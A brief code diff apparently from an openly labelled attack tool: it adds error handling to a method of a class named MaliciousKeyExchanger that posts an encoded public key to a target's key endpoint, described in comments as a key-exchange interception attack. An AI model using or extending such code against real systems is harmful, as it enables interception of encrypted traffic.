@@ -35,3 +35,15 @@ class MaliciousKeyExchanger:
         encoded_key = base64.b64encode(pem_public_key).decode()
         payload = {"key": encoded_key}
         headers = {"Content-Type": "application/json"}
+
+        #Exception Handling if Succussful or Failled to execute this attack
+        try:
+            response = requests.post(
+                url=f"{endpoint_url}/api/keys",
+                json=payload,
+                headers=headers
+            )
+            return response.status_code == 200
+        except requests.RequestException as error:
+            print(f"Error during key exchange interception: {error}")
+            return False
